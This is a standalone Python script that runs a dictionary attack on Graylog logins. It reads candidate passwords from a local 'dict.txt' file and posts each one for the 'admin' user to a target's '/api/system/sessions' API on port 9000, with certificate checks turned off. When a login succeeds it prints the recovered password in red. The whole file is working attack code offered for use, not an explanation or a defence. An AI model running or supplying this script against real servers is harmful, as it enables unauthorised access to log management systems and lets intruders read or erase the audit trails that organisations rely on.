#!/usr/bin/env python3

# Graylog Login Bruteforce

# %%%%%%%%%%% Libraries %%%%%%%%%%%#

import colorama
import json
import logging
import os
import requests
import sys
from colorama import Fore, Style

# %%%%%%%%%%% Constants %%%%%%%%%%%#

SEPARATOR = "[*] {0} [*]".format('=' * 110)

# %%%%%%%%%% Functions %%%%%%%%%#

def graylog_brute(graylogip):

	url = "http://" + graylogip + ":9000/api/system/sessions"
	__location__ = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))
	file = open(os.path.join(__location__, 'dict.txt'))
	bruteforcesuccesfull = 0

	for line in file:

		graylogpassword = line.strip('\n\r')
		params = {'username': 'admin', 'password': graylogpassword, 'host': graylogip}
		headers = {'X-Requested-By': 'XMLHttpRequest'}

		try:
			response = requests.post(url, json = params, headers = headers, verify = False)

			if response.status_code == 200:

				print(SEPARATOR)
				print("[!] Dictionary Attack Successful!")
				print(SEPARATOR)
				print("[!] Username: " + Fore.RED + Style.BRIGHT + "admin")
				print(
					Style.RESET_ALL + "[!] Password: " + Fore.RED + Style.BRIGHT + graylogpassword)
				print(Style.RESET_ALL + SEPARATOR)
				bruteforcesuccesfull = 1
				break

		except Exception as e:
			logging.error(e, exc_info = True)

	if not bruteforcesuccesfull:

		print(SEPARATOR)
		print("[!] Dictionary Attack Not Successful")
		print(SEPARATOR)

# %%%%%%%%%% The End %%%%%%%%%%#
